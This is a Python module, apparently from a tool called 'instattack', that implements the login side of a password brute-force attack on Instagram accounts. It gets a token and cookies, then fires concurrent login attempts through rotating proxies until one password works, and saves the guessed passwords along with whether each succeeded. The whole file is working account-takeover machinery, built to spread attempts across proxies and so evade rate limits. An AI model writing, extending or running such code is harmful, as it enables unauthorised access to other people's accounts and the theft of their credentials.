import asyncio
import aiohttp

from instattack.config import config
from instattack.lib import logger

from instattack.lib.utils import limit_as_completed, start_and_stop

from instattack.app.exceptions import TokenNotFound, PoolNoProxyError
from instattack.app.proxies import AdvancedProxyPool

from .base import AbstractRequestHandler
from .proxies import BrokeredProxyHandler
from .client import instagram_client


log = logger.get(__name__, 'Login Handler')


class AbstractLoginHandler(AbstractRequestHandler):

    __client__ = instagram_client

    def __init__(self, *args, **kwargs):
        super(AbstractLoginHandler, self).__init__(*args, **kwargs)

        self.user = self.loop.user
        self.attempts_to_save = []

        self._cookies = None
        self._token = None

    @property
    def token(self):
        if not self._token:
            raise RuntimeError('Token Not Found Yet')
        return self._token

    async def cookies(self):
        if not self._cookies:
            sess = aiohttp.ClientSession(connector=self.connector)

            self._token, self._cookies = await self.client.get_token(sess)
            if not self._token:
                raise TokenNotFound()

            await sess.close()
        return self._cookies

    async def generate_attempts_for_proxies(self, session, password):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            proxy = await self.proxy_handler.pool.get()
            if not proxy:
                raise PoolNoProxyError()

            yield self.client.login(
                session=session,
                token=self.token,
                password=password,
                proxy=proxy,
            )

    async def attempt_login_with_password(self, session, password):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.

        [x] TODO:
        --------
        We should figure out a way to allow proxies to repopulate and wait
        on them for large number of password requests.  We don't want to bail when
        there are no more proxies because we might be using them all currently
        """

        # Stop Event: Notifies limit_as_completed to stop creating additional tasks
        # so that we can cancel the leftover ones.
        stop_event = asyncio.Event()

        batch_size = config['attempts']['batch_size']

        num_tries = 0
        gen = self.generate_attempts_for_proxies(session, password)
        async for fut in limit_as_completed(gen, batch_size, stop_event):
            if fut.exception():
                raise fut.exception()

            result = fut.result()
            num_tries += 1

            if result is not None:
                stop_event.set()

                # [!] IMPORTANT:  We should reimplement returning the leftover
                # tasks somehow, or at least cancel them in the utility, because
                # that can lead to bogging down the requests.
                return result, num_tries

    async def handle_attempt(self, result):
        if config['attempts']['save_method'] == 'live':
            task = self.user.create_or_update_attempt(
                result.password,
                success=result.authorized
            )
            await self.schedule_task(task)
        else:
            if (result.password, result.authorized) not in self.attempts_to_save:
                self.attempts_to_save.append((result.password, result.authorized))

    async def finish(self):
        """
        [x] TODO:
        --------
        Figure out a way to guarantee that this always gets run even if we hit
        some type of error.
        """
        await super(AbstractLoginHandler, self).finish()

        if config['attempts']['save_method'] == 'end':
            with start_and_stop(f"Saving {len(self.attempts_to_save)} Attempts"):
                tasks = [
                    self.user.create_or_update_attempt(att[0], success=att[1])
                    for att in self.attempts_to_save
                ]
                await asyncio.gather(*tasks)


class LoginHandler(AbstractLoginHandler):

    __name__ = 'Attack Handler'
    __proxy_handler__ = BrokeredProxyHandler
    __proxy_pool__ = AdvancedProxyPool

    async def login(self, password):
        try:
            results = await asyncio.gather(
                self._login(password),
                self.proxy_handler.run(),
            )
        except Exception as e:
            await self.finish()
            await self.proxy_handler.stop()
            raise e
        else:
            # We might not need to stop proxy handler?
            await self.proxy_handler.stop()
            return results[0]

    async def _login(self, password):
        cookies = await self.cookies()
        await self.start_event.wait()

        async with aiohttp.ClientSession(
            connector=self.connector,
            cookies=cookies,
            timeout=self.timeout,
        ) as session:
            result, num_tries = await self.attempt_login_with_password(session, password)

            log.debug(f'Required {num_tries} Attempts to Login')

            await self.handle_attempt(result)
            return result
